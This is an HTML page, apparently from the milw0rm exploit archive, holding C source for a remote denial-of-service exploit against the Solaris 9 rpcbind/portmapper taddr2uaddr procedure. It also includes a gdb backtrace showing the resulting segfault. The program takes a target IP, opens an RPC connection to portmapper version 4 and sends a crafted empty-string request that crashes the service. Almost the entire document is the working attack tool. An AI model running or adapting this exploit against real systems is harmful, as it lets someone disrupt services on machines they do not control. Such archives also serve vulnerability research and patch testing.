<html><head><title>Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS Exploit</title></head><pre>/*
////////////////////////////////////////////////////////////
// Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS
////////////////////////////////////////////////////////////
//
// Federico L. Bossi Bonin
// fbossi[at]globalST[dot]com[dot]ar
/////////////////////////////////////////////////////


Program received signal SIGSEGV, Segmentation fault.
0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
(gdb) backtrace
#0  0xff29b5f4 in __inet_taddr2uaddr () from /usr/lib/libnsl.so.1
#1  0x00013d88 in rpcbproc_taddr2uaddr_com ()
#2  0x000161c0 in rpcb_service_4 ()
(gdb)

*/

#include &lt;string.h&gt;
#include &lt;rpc/rpc.h&gt;

struct xdr {
        long long_arg;
        char *string_arg;
};

typedef struct xdr xdr;
static struct timeval TIMEOUT = { 25, 0 };

bool_t xdr_xdr (XDR *xdrs, xdr *objp) {
        register int32_t *buf;

         if (!xdr_long (xdrs, &amp;objp-&gt;long_arg))
                 return FALSE;
         if (!xdr_string (xdrs, &amp;objp-&gt;string_arg, 4096))
                 return FALSE;
        return TRUE;
}

char ** str_4(xdr *argp, CLIENT *clnt) {
        static char *clnt_res;

        memset((char *)&amp;clnt_res, 0, sizeof(clnt_res));
        if (clnt_call (clnt, 8,
                (xdrproc_t) xdr_xdr, (caddr_t) argp,
                (xdrproc_t) xdr_wrapstring, (caddr_t) &amp;clnt_res,
                TIMEOUT) != RPC_SUCCESS) {
                return (NULL);
        }
        return (&amp;clnt_res);
}

main(int argc, char *argv[]) {
  CLIENT *c1;
  char *server;
  char **sresult;


  if (argc !=2){
    printf(&quot;=============================================================\n&quot;);
    printf(&quot;Solaris 9 PortBind XDR-DECODE taddr2uaddr() Remote DoS\n&quot;);
    printf(&quot;-------------------------------------------------------------\n&quot;);
    printf(&quot;Federico L. Bossi Bonin &lt;fbossi@globalST.com.ar&gt;\n&quot;);
    printf(&quot;=============================================================\n\n&quot;);
    printf(&quot;usage: %s &lt;IP&gt;\n&quot;,argv[0]);
    exit(1);
  }

  server = argv[1];

if ((c1 = clnt_create(server,100000, 4, &quot;tcp&quot;)) == NULL){
       clnt_pcreateerror(server);
    exit(1);
  }

  xdr xdrmessage; 
  xdrmessage.long_arg = 0;
  xdrmessage.string_arg=&quot;&quot;;

  if ((sresult = str_4(&amp;xdrmessage, c1)) == NULL){ 
   clnt_perror(c1, server);
   exit(1);
  }

  clnt_destroy(c1);
  exit(0);
}

// milw0rm.com [2008-10-17]</pre></html>